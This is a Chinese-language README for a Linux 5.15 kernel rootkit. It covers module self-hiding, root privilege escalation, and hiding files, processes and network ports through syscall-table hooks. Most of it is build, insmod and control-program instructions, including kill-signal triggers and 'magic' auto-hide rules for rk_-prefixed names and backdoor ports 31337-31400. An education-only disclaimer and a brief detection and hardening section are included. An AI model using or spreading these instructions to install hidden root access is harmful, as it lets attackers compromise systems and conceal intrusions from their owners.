# Advanced Linux Rootkit

一个基于Linux内核5.15.142版本开发的高级rootkit程序，具备模块隐藏、提权、文件隐藏、进程隐藏和端口隐藏等功能。

## ⚠️ 重要声明

**本项目仅供教育和研究目的使用！**

- 本rootkit程序仅用于网络安全研究、渗透测试学习和系统安全防护研究
- 严禁将此程序用于任何非法活动或恶意攻击
- 使用者需要承担使用本程序的所有法律责任
- 作者不对因使用本程序造成的任何损失或法律后果负责

## 功能特性

### 🔒 模块隐藏
- 从 `/proc/modules` 中隐藏模块
- 从 `lsmod` 命令中隐藏模块
- 从内核模块链表中移除
- 从 sysfs 文件系统中隐藏
- 支持动态显示/隐藏切换

### 🚀 权限提升
- 直接修改进程 `cred` 结构提权到root
- 使用 `commit_creds` 安全提权
- 覆盖安全检查函数
- 添加所有 capabilities
- Hook `setuid` 系统调用
- 支持魔术进程自动提权

### 📁 文件隐藏
- 从 `ls`、`find` 等命令中隐藏文件
- 支持精确匹配、部分匹配、前缀匹配
- 支持简化正则表达式匹配
- Hook多个系统调用：`getdents64`、`open`、`stat`等
- 支持隐藏文件列表管理

### 👻 进程隐藏
- 从 `ps`、`top`、`htop` 等命令中隐藏进程
- 从 `/proc` 文件系统中隐藏进程目录
- 支持按PID、进程名、前缀隐藏
- 支持按父进程、用户ID隐藏
- 魔术进程名自动隐藏
- 支持批量隐藏子进程

### 🌐 端口隐藏
- 从 `netstat`、`ss` 命令中隐藏网络连接
- 从 `/proc/net/*` 文件中隐藏连接信息
- 支持按端口、地址、连接隐藏
- 支持端口范围隐藏
- 魔术端口自动隐藏
- 常见后门端口批量隐藏

### 🎮 用户态控制
- 命令行接口控制所有功能
- 交互式控制模式
- 通过 `/proc/rootkit_control` 接口通信
- 支持信号控制
- 实时状态查询

## 系统要求

⚠️ **重要提示：此rootkit只能在Linux系统上编译和运行，不支持macOS、Windows等其他操作系统**

- **操作系统**：Linux发行版（Ubuntu、CentOS、Debian等）
- **内核版本**：5.15.x（推荐5.15.142，其他版本可能需要适配）
- **架构**: x86_64
- **权限**: root权限
- **编译环境**: 
  - GCC 9.0+ 编译器
  - Linux内核头文件
  - Make工具

### 环境检查

在编译前，请确保满足以下条件：

```bash
# 检查操作系统
uname -s  # 应该显示 Linux

# 检查内核版本
uname -r  # 应该显示类似 5.15.x-xxx

# 检查内核头文件是否安装
ls /lib/modules/$(uname -r)/build  # 应该存在且包含内核头文件
```

## 内核头文件安装

### Ubuntu/Debian系统

```bash
# 更新包管理器
sudo apt update

# 安装当前内核的头文件
sudo apt install linux-headers-$(uname -r)

# 或者安装通用内核头文件
sudo apt install linux-headers-generic

# 验证安装
ls /lib/modules/$(uname -r)/build
```

### CentOS/RHEL/Fedora系统

```bash
# CentOS/RHEL
sudo yum install kernel-devel kernel-headers
# 或者使用dnf (较新版本)
sudo dnf install kernel-devel kernel-headers

# Fedora
sudo dnf install kernel-devel kernel-headers

# 验证安装
ls /lib/modules/$(uname -r)/build
```

### Arch Linux系统

```bash
# 安装内核头文件
sudo pacman -S linux-headers

# 验证安装
ls /lib/modules/$(uname -r)/build
```

## 内核源码获取（可选）

如果需要特定内核版本的源码进行开发或调试：

```bash
# 下载Linux 5.15.142内核源码
wget https://cdn.kernel.org/pub/linux/kernel/v5.x/linux-5.15.142.tar.xz
tar -xf linux-5.15.142.tar.xz
cd linux-5.15.142

# 配置内核（使用当前系统配置）
cp /boot/config-$(uname -r) .config
make oldconfig

# 编译内核模块支持
make modules_prepare
```

```bash
# 内核源码下载地址
wget https://www.kernel.org/pub/linux/kernel/v5.x/linux-5.15.142.tar.xz

# Git仓库
git clone https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git
```

## 编译安装

📋 **详细部署指南**: 请参考 [DEPLOYMENT.md](DEPLOYMENT.md) 获取在不同Linux发行版上的详细部署说明。

🔧 **故障排除**: 如果遇到编译或运行问题，请参考 [TROUBLESHOOTING.md](TROUBLESHOOTING.md) 获取详细的解决方案。

### 快速测试（推荐）

我们提供了一个自动化测试脚本，可以检查编译环境并自动编译：

```bash
# 克隆项目
git clone <repository-url>
cd rootkit

# 运行测试脚本（会自动检查环境并编译）
./test_compile.sh
```

### Linux内核5.15兼容性修复

如果在Linux内核5.15上编译时遇到以下错误：
- `redefinition of 'struct linux_dirent64'`
- `proc_find_entry` 函数未定义
- `THIS_MODULE` 重复声明

请运行我们提供的自动修复脚本：

```bash
# 在Linux系统上运行修复脚本
./apply_kernel_fix.sh
```

该脚本会自动：
1. 备份原始文件
2. 应用内核5.15兼容性补丁
3. 尝试重新编译
4. 如果失败则恢复备份

### 手动编译

如果你想手动编译，请按以下步骤：

### 1. 克隆或下载源码

```bash
# 进入项目目录
cd rootkit
```

### 2. 检查内核版本

```bash
uname -r
# 确保内核版本为 5.15.142 或兼容版本
```

### 3. 安装内核头文件

```bash
# Ubuntu/Debian
sudo apt-get install linux-headers-$(uname -r)

# CentOS/RHEL
sudo yum install kernel-devel-$(uname -r)

# Arch Linux
sudo pacman -S linux-headers
```

### 4. 编译模块

```bash
# 检查环境（确保在Linux系统上）
uname -s  # 应该显示 Linux
ls /lib/modules/$(uname -r)/build  # 确保内核头文件存在

# 编译内核模块和用户态程序
make

# 或者分别编译
make all          # 编译所有
make kernel       # 仅编译内核模块
make userspace    # 仅编译用户态程序
```

### 5. 加载模块

```bash
# 加载rootkit模块
sudo make install

# 或手动加载
sudo insmod rootkit.ko
```

## 使用方法

### 命令行模式

```bash
# 基本用法
sudo ./control <command> [arguments]

# 模块控制
sudo ./control hide_module          # 隐藏模块
sudo ./control show_module          # 显示模块
sudo ./control module_status        # 查看模块状态

# 权限提升
sudo ./control escalate             # 提升当前进程权限
sudo ./control escalate <pid>       # 提升指定进程权限

# 文件隐藏
sudo ./control hide_file /path/to/file     # 隐藏文件
sudo ./control unhide_file /path/to/file   # 取消隐藏文件
sudo ./control list_hidden_files           # 列出隐藏文件

# 进程隐藏
sudo ./control hide_process <pid>          # 按PID隐藏进程
sudo ./control hide_process_name <name>    # 按名称隐藏进程
sudo ./control unhide_process <pid>        # 取消隐藏进程
sudo ./control list_hidden_processes       # 列出隐藏进程

# 端口隐藏
sudo ./control hide_port <port>            # 隐藏端口
sudo ./control hide_connection <local_ip:port> <remote_ip:port>  # 隐藏连接
sudo ./control unhide_port <port>          # 取消隐藏端口
sudo ./control list_hidden_ports           # 列出隐藏端口

# 系统信息
sudo ./control status                      # 查看整体状态
sudo ./control help                        # 显示帮助信息
```

### 交互模式

```bash
# 启动交互模式
sudo ./control -i

# 在交互模式中使用命令
rootkit> help
rootkit> hide_module
rootkit> status
rootkit> exit
```

### 信号控制

```bash
# 使用kill命令发送控制信号
kill -64 1    # 隐藏模块
kill -64 2    # 显示模块
kill -64 3    # 提权当前进程
kill -64 10   # 隐藏当前进程
kill -64 11   # 显示当前进程
```

## 魔术功能

### 自动隐藏规则

1. **文件名前缀**: 以 `rk_` 开头的文件自动隐藏
2. **进程名前缀**: 以 `rk_` 开头的进程自动隐藏
3. **魔术进程名**: 名为 `rootkit_proc` 的进程自动隐藏
4. **魔术端口**: 31337-31400 范围内的端口自动隐藏
5. **控制端口**: 31337端口自动隐藏

### 特殊文件

- `/proc/rootkit_control`: rootkit控制接口
- `/tmp/.rootkit_*`: 临时文件自动隐藏
- `/var/log/rootkit.log`: 日志文件自动隐藏

## 配置选项

### 编译时配置

在相应的源文件中可以修改以下宏定义：

```c
#define MAX_HIDDEN_FILES 100        // 最大隐藏文件数
#define MAX_HIDDEN_PROCS 500        // 最大隐藏进程数
#define MAX_HIDDEN_PORTS 200        // 最大隐藏端口数
#define HIDE_PREFIX "rk_"           // 自动隐藏前缀
#define MAGIC_PORT_RANGE_START 31337 // 魔术端口范围开始
#define MAGIC_PORT_RANGE_END 31400   // 魔术端口范围结束
```

### 运行时配置

通过控制程序可以动态配置各种参数和规则。

## 检测与防护

### 检测方法

1. **内核完整性检查**:
   ```bash
   # 检查系统调用表完整性
   cat /proc/kallsyms | grep sys_call_table
   ```

2. **模块检查**:
   ```bash
   # 比较不同方式获取的模块列表
   lsmod
   cat /proc/modules
   ls /sys/module/
   ```

3. **进程检查**:
   ```bash
   # 比较不同工具显示的进程
   ps aux
   ls /proc/
   top
   ```

4. **网络连接检查**:
   ```bash
   # 比较不同工具显示的连接
   netstat -tulpn
   ss -tulpn
   cat /proc/net/tcp
   ```

### 防护建议

1. **内核保护**:
   - 启用内核地址空间布局随机化 (KASLR)
   - 使用内核控制流完整性 (CFI)
   - 启用SMEP/SMAP保护

2. **系统监控**:
   - 使用HIDS系统监控文件完整性
   - 监控系统调用异常
   - 定期检查内核模块

3. **访问控制**:
   - 限制root权限使用
   - 使用SELinux/AppArmor
   - 启用内核模块签名验证

## 故障排除

### 常见问题

1. **编译失败**:
   ```bash
   # 检查内核头文件
   ls /lib/modules/$(uname -r)/build
   
   # 检查编译器版本
   gcc --version
   ```

2. **加载失败**:
   ```bash
   # 查看详细错误信息
   dmesg | tail
   
   # 检查内核版本兼容性
   modinfo rootkit.ko
   ```

3. **功能异常**:
   ```bash
   # 查看rootkit日志
   dmesg | grep rootkit
   
   # 检查控制接口
   ls -la /proc/rootkit_control
   ```

### 调试模式

```bash
# 编译调试版本
make debug

# 查看调试信息
make info

# 运行测试
make test
```

## 卸载清理

```bash
# 卸载模块
sudo make uninstall

# 或手动卸载
sudo rmmod rootkit

# 清理编译文件
make clean

# 完全清理
make distclean
```

## 开发信息

### 项目结构

```
rootkit/
├── rootkit.c              # 主模块文件
├── module_hiding.c        # 模块隐藏实现
├── privilege_escalation.c # 提权功能实现
├── file_hiding.c          # 文件隐藏实现
├── process_hiding.c       # 进程隐藏实现
├── port_hiding.c          # 端口隐藏实现
├── control.c              # 用户态控制程序
├── Makefile              # 编译配置
└── README.md             # 说明文档
```

### 技术实现

1. **系统调用Hook**: 通过修改系统调用表实现功能Hook
2. **内核数据结构操作**: 直接操作内核链表和数据结构
3. **proc文件系统**: 创建控制接口和信息查询接口
4. **内存管理**: 使用内核内存分配函数管理数据
5. **同步机制**: 使用互斥锁保护共享数据

### 兼容性

- **内核版本**: 主要针对5.15.142，可能兼容5.15.x系列
- **架构**: x86_64 (可移植到其他架构)
- **发行版**: 测试过Ubuntu、CentOS、Debian

## 法律声明

本项目遵循以下原则：

1. **教育目的**: 仅用于网络安全教育和研究
2. **合法使用**: 仅在授权环境中使用
3. **责任声明**: 使用者承担所有法律责任
4. **禁止滥用**: 严禁用于非法活动

## 贡献指南

欢迎安全研究人员贡献代码和改进建议：

1. Fork项目
2. 创建功能分支
3. 提交更改
4. 发起Pull Request

## 许可证

本项目仅供教育和研究使用，不提供任何形式的保证。

## 联系信息

如有技术问题或安全研究合作，请通过适当渠道联系。

---

**再次提醒：本程序仅供教育和研究目的，请勿用于非法活动！**